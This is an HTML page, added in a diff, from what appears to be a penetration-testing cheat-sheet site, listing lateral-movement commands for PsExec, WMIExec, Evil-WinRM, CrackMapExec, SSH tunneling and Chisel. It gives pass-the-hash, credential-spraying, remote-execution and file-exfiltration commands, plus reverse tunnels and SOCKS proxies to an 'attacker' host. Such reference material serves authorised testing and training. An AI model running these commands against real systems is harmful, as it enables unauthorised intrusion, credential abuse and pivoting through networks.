@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="icon" type="image/svg+xml" href="../assets/images/dragon-logo.svg">
+<link rel="icon" type="image/png" href="../assets/images/dragon-favicon.png">
+<title>Lateral Movement – Hacking Tools</title>
+<link rel="stylesheet" type="text/css" href="../assets/css/style.css">
+
+</head>
+
+<body class="theme-standard" data-page-key="tools-lateral">
+<div class="wallpaper"></div>
+
+<div class="tool-section-nav"><a href="../index.html?page=dashboard" target="_top">&larr; Back to Dashboard</a></div>
+
+<h1 class="category-title">Lateral Movement</h1>
+
+<div class="grid">
+  <div class="modal" style="margin: 0 auto 3rem; max-width: 1000px; cursor: default;">
+    <table>
+      <tr><th>Tool</th><th>Description</th></tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-psexec')">
+        <td>PsExec</td><td>Execute commands on remote Windows hosts</td>
+      </tr>
+      <tr id="cmd-psexec" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Interactive shell] — psexec \\&lt;IP&gt; -u user -p password cmd.exe</div>
+    <div>[Impacket variant] — psexec.py domain/user:pass@&lt;IP&gt;</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Run as SYSTEM] — psexec \\&lt;IP&gt; -s cmd.exe</div>
+    <div>[Copy & run binary] — psexec \\&lt;IP&gt; -c payload.exe</div>
+    <div>[Pass the hash] — psexec.py -hashes &lt;LM:NT&gt; domain/user@&lt;IP&gt;</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-wmiexec')">
+        <td>WMIExec</td><td>Use WMI for remote command execution</td>
+      </tr>
+      <tr id="cmd-wmiexec" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Semi-interactive shell] — wmiexec.py domain/user:pass@&lt;IP&gt;</div>
+    <div>[Pass the hash] — wmiexec.py -hashes &lt;LM:NT&gt; domain/user@&lt;IP&gt;</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Run single command] — wmiexec.py domain/user:pass@&lt;IP&gt; "whoami /all"</div>
+    <div>[Blind / no output] — wmiexec.py -nooutput domain/user:pass@&lt;IP&gt;</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-evilwinrm-lat')">
+        <td>Evil-WinRM</td><td>WinRM shell used for lateral movement</td>
+      </tr>
+      <tr id="cmd-evilwinrm-lat" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Connect] — evil-winrm -i &lt;IP&gt; -u user -p password</div>
+    <div>[Pass the hash] — evil-winrm -i &lt;IP&gt; -u user -H &lt;HASH&gt;</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Load PowerShell scripts] — evil-winrm -i &lt;IP&gt; -u user -p password -s /path/scripts/</div>
+    <div>[Load executables] — evil-winrm -i &lt;IP&gt; -u user -p password -e /path/exes/</div>
+
+    <div class="comment-line">---- File transfer -----</div>
+    <div>[Upload] — upload local.txt C:\Windows\Temp\local.txt</div>
+    <div>[Download] — download C:\Windows\Temp\loot.txt local.txt</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-cme-lat')">
+        <td>CrackMapExec</td><td>Spray creds and pivot across hosts</td>
+      </tr>
+      <tr id="cmd-cme-lat" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Scan subnet] — crackmapexec smb 10.0.0.0/24 -u user -p password</div>
+    <div>[Pass the hash] — crackmapexec smb &lt;IP&gt; -u user -H &lt;HASH&gt;</div>
+
+    <div class="comment-line">---- Pivot -----</div>
+    <div>[Execute across subnet] — crackmapexec smb 10.0.0.0/24 -u user -p password -x whoami</div>
+    <div>[Find local-admin access] — crackmapexec smb 10.0.0.0/24 -u user -p password --local-auth</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-ssh-tunnel')">
+        <td>SSH tunneling</td><td>Forward ports and pivot through SSH</td>
+      </tr>
+      <tr id="cmd-ssh-tunnel" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Local port forward] — ssh -L 8080:internal:80 user@jumpbox</div>
+    <div>[Remote port forward] — ssh -R 4444:127.0.0.1:4444 user@jumpbox</div>
+    <div>[Dynamic (SOCKS proxy)] — ssh -D 1080 user@jumpbox</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Background, no shell] — ssh -fN -L 8080:internal:80 user@jumpbox</div>
+    <div>[SSH with key] — ssh -i key.pem -L 8080:internal:80 user@jumpbox</div>
+    <div>[Route through SOCKS] — proxychains curl http://internal</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-chisel')">
+        <td>Chisel</td><td>TCP tunneling and reverse proxies</td>
+      </tr>
+      <tr id="cmd-chisel" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Start server] — chisel server -p 8000 --reverse</div>
+    <div>[Reverse tunnel client] — chisel client attacker:8000 R:8080:internal:80</div>
+
+    <div class="comment-line">---- Modes -----</div>
+    <div>[Forward proxy client] — chisel client attacker:8000 8080:internal:80</div>
+    <div>[SOCKS5 proxy] — chisel client attacker:8000 R:socks</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Authenticated server] — chisel server -p 8000 --auth user:pass --reverse</div>
+    <div>[Fingerprint pinning] — chisel client --fingerprint &lt;FP&gt; attacker:8000 R:socks</div>
+
+  </td>
+</tr>
+    </table>
+  </div>
+</div>
+
+<script>
+  const embedded = window.self !== window.top;
+
+  // Tell the hub's modal our real content height. Called synchronously on
+  // the one interaction that changes it (toggling a command row) so there's
+  // no dependency on observer/timer scheduling; ResizeObserver below is
+  // just a fallback for anything else (initial layout, font swaps, etc).
+  function reportHeight() {
+    if (embedded) {
+      window.parent.postMessage({ type: "tool-frame-height", height: document.body.scrollHeight }, "*");
+    }
+  }
+
+  function toggleCmd(id) {
+    const row = document.getElementById(id);
+    row.style.display = (row.style.display === "table-row") ? "none" : "table-row";
+    reportHeight();
+  }
+
+  (function() {
+    const savedTheme = localStorage.getItem("/settings.html") || "standard";
+    document.body.classList.add("theme-" + savedTheme);
+    if (embedded) document.body.classList.add("embedded");
+  })();
+
+  if (embedded) {
+    new ResizeObserver(reportHeight).observe(document.body);
+    window.addEventListener("load", reportHeight);
+  }
+</script>
+
+<script src="../config/tools/lateral.js"></script>
+<script src="../assets/script/wallpaper-loader.js"></script>
+<script src="../assets/script/theme-accent.js"></script>
+<script src="../assets/script/copy-commands.js"></script>
+<script src="../assets/script/page-effects.js"></script>
+<script src="../assets/script/page-effects-loader.js"></script>
+<script>
+  applyWallpaper(toolsLateralConfig.background, "tools-lateral");
+</script>
+
+</body>
+</html>
